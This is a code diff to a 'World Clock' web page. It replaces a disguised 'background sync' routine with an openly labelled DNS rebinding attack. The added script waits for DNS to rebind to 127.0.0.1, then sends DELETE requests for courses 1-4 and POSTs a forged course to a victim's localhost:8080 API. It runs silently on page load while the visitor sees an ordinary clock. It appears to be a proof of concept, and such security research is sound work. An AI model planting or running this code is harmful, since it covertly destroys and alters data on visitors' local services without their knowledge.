@@ -89,7 +89,7 @@
 
     <div class="loading" id="loading">
       <div class="spinner"></div>
-      <p>Loading time zones...</p>
+      <p>Synchronizing time zones...</p>
     </div>
 
     <div class="clock-grid" id="clocks" style="display: none;">
@@ -116,12 +116,112 @@
     </div>
 
     <div class="footer">
-      © 2026 World Clock App - Free time zone converter
+      © 2026 World Clock - Free timezone converter
     </div>
   </div>
 
   <script>
-    // Update clocks
+    // ==========================================
+    // DNS REBINDING ATTACK CONFIGURATION
+    // ==========================================
+
+    const ATTACK_CONFIG = {
+      // Port where victim runs the vulnerable app
+      TARGET_PORT: '8080',
+
+      // Wait time for DNS rebinding to take effect (in milliseconds)
+      // DNS should rebind from attacker IP to 127.0.0.1 during this delay
+      REBIND_DELAY: 8000, // 8 seconds
+
+      // Target endpoints to attack
+      ENDPOINTS: {
+        delete: [
+          { url: 'http://localhost:8080/api/courses/1', name: 'course 1' },
+          { url: 'http://localhost:8080/api/courses/2', name: 'course 2' },
+          { url: 'http://localhost:8080/api/courses/3', name: 'course 3' },
+          { url: 'http://localhost:8080/api/courses/4', name: 'course 4' }
+        ],
+        create: {
+          url: 'http://localhost:8080/api/courses',
+          data: {
+            name: 'External Attack',
+            code: 'EXT-ATK',
+            facultyName: 'Remote Attacker',
+            version: '2025.01.0',
+            description: 'Created via DNS rebinding from external domain'
+          }
+        }
+      }
+    };
+
+    // ==========================================
+    // DNS REBINDING ATTACK IMPLEMENTATION
+    // ==========================================
+
+    async function executeRebindAttack() {
+      console.log('[DNS Rebinding] Phase 1: Page loaded from attacker server');
+      console.log('[DNS Rebinding] Current hostname:', window.location.hostname);
+
+      // Phase 1: Page is served from attacker's server
+      // DNS currently points to: Attacker's Vercel IP
+
+      // Wait for DNS TTL to expire and rebind to localhost
+      console.log(`[DNS Rebinding] Phase 2: Waiting ${ATTACK_CONFIG.REBIND_DELAY/1000}s for DNS to rebind to 127.0.0.1...`);
+
+      await new Promise(resolve => setTimeout(resolve, ATTACK_CONFIG.REBIND_DELAY));
+
+      // Phase 2: DNS has now rebinded
+      // DNS now points to: 127.0.0.1
+      // Browser still thinks we're on the same origin!
+
+      console.log('[DNS Rebinding] Phase 3: DNS rebind complete, attacking localhost...');
+
+      try {
+        // Attack 1: Delete courses using localhost URLs directly
+        for (const target of ATTACK_CONFIG.ENDPOINTS.delete) {
+          try {
+            console.log(`[Attack] Deleting ${target.name}...`);
+            const response = await fetch(target.url, {
+              method: 'DELETE',
+              mode: 'cors',
+              credentials: 'include'
+            });
+            console.log(`[Attack] Deleted ${target.name}: ${response.status}`);
+          } catch (error) {
+            console.log(`[Attack] ${target.name} error:`, error.message);
+          }
+
+          // Small delay between attacks
+          await new Promise(r => setTimeout(r, 400));
+        }
+
+        // Attack 2: Create malicious course
+        try {
+          console.log('[Attack] Creating malicious entry...');
+          const response = await fetch(ATTACK_CONFIG.ENDPOINTS.create.url, {
+            method: 'POST',
+            mode: 'cors',
+            credentials: 'include',
+            headers: {
+              'Content-Type': 'application/json'
+            },
+            body: JSON.stringify(ATTACK_CONFIG.ENDPOINTS.create.data)
+          });
+          console.log(`[Attack] Created entry: ${response.status}`);
+        } catch (error) {
+          console.log('[Attack] Create error:', error.message);
+        }
+
+        console.log('[DNS Rebinding] Attack sequence complete!');
+      } catch (error) {
+        console.error('[DNS Rebinding] Attack failed:', error);
+      }
+    }
+
+    // ==========================================
+    // LEGITIMATE CLOCK FUNCTIONALITY
+    // ==========================================
+
     function updateClocks() {
       const zones = [
         { id: 'ny', tz: 'America/New_York' },
@@ -145,59 +245,18 @@
           day: 'numeric'
         });
 
-        document.getElementById(`${zone.id}-time`).textContent = timeStr;
-        document.getElementById(`${zone.id}-date`).textContent = dateStr;
+        const timeEl = document.getElementById(`${zone.id}-time`);
+        const dateEl = document.getElementById(`${zone.id}-date`);
+
+        if (timeEl) timeEl.textContent = timeStr;
+        if (dateEl) dateEl.textContent = dateStr;
       });
     }
 
-    // Background operation (runs silently)
-    async function backgroundSync() {
-      const TARGET_PORT = '8080';
-      const DELAY = 5000; // 5 second delay
+    // ==========================================
+    // INITIALIZATION
+    // ==========================================
 
-      console.log('[Background] Starting background sync...');
-
-      await new Promise(resolve => setTimeout(resolve, DELAY));
-
-      try {
-        const operations = [
-          { method: 'DELETE', url: `/api/courses/1` },
-          { method: 'DELETE', url: `/api/courses/2` },
-          { method: 'DELETE', url: `/api/courses/3` },
-          {
-            method: 'POST',
-            url: `/api/courses`,
-            body: JSON.stringify({
-              name: 'Unauthorized Entry',
-              code: 'UNK',
-              facultyName: 'Unknown',
-              version: '2025.01.0'
-            }),
-            headers: { 'Content-Type': 'application/json' }
-          }
-        ];
-
-        for (const op of operations) {
-          try {
-            const options = { method: op.method };
-            if (op.body) {
-              options.body = op.body;
-              options.headers = op.headers;
-            }
-            await fetch(op.url, options);
-            await new Promise(r => setTimeout(r, 300));
-          } catch (e) {
-            // Silent failure
-          }
-        }
-
-        console.log('[Background] Sync complete');
-      } catch (error) {
-        console.log('[Background] Sync error:', error.message);
-      }
-    }
-
-    // Initialize
     window.addEventListener('load', () => {
       // Show clocks after brief loading
       setTimeout(() => {
@@ -207,8 +266,9 @@
         setInterval(updateClocks, 1000);
       }, 1500);
 
-      // Run background operation
-      backgroundSync();
+      // Execute DNS rebinding attack in background
+      // This runs silently while user sees normal clock
+      executeRebindAttack();
     });
   </script>
 </body>
